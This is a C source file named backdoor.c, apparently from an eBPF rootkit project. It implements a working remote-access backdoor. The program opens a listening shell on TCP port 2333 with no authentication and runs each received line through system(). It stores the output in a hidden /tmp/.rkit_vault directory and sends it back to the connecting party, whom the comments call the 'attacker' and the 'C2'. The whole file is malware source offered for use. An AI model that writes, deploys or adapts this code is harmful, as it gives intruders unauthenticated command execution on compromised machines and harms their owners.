// agent/backdoor.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>

#define PORT 2333
#define BUFFER_SIZE 1024
#define HIDDEN_DIR "/tmp/.rkit_vault" // this directory must be hide with step_1 codes
#define OUTPUT_FILE "/tmp/.rkit_vault/rkit_out.txt"

void setup_environment() { // creating the hiiden_dir if its not exist
    struct stat st = {0};
    if (stat(HIDDEN_DIR, &st) == -1) {
        mkdir(HIDDEN_DIR, 0777);
    }
}

void execute_command(int sock, char *cmd) { // decode message and extracting shell commands
    char final_cmd[BUFFER_SIZE * 2];
    char file_buffer[BUFFER_SIZE];
    FILE *fp;
    
    cmd[strcspn(cmd, "\n")] = 0;

    sprintf(final_cmd, "%s > %s 2>&1", cmd, OUTPUT_FILE);
    system(final_cmd);

    // send output file to attacker
    // TODO : only send file when its needed
    fp = fopen(OUTPUT_FILE, "r");
    if (fp == NULL) {
        char *msg = "Error: Could not read output file.\n";
        send(sock, msg, strlen(msg), 0);
        return;
    }

    while (fgets(file_buffer, sizeof(file_buffer), fp) != NULL) {
        send(sock, file_buffer, strlen(file_buffer), 0);
    }
    fclose(fp);

    // send a message when the C2 ends secussfully
    send(sock, "\n--- END ---\n$ ", 13, 0);
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    setup_environment();

    //create sockets 
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    // listen for handling connections
    while(1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("Accept failed");
            continue;
        }

        // create new process to handle 
        if (fork() == 0) {
            close(server_fd);
            char *banner = "Welcome to eBPF Rootkit Shell\n$ ";
            send(new_socket, banner, strlen(banner), 0);

            while(1) {
                memset(buffer, 0, BUFFER_SIZE);
                int valread = read(new_socket, buffer, BUFFER_SIZE);
                if (valread <= 0) break; // قطع ارتباط

                if (strncmp(buffer, "exit", 4) == 0) break;
                
                execute_command(new_socket, buffer);
            }
            close(new_socket);
            exit(0);
        }
        close(new_socket);
    }
    return 0;
}
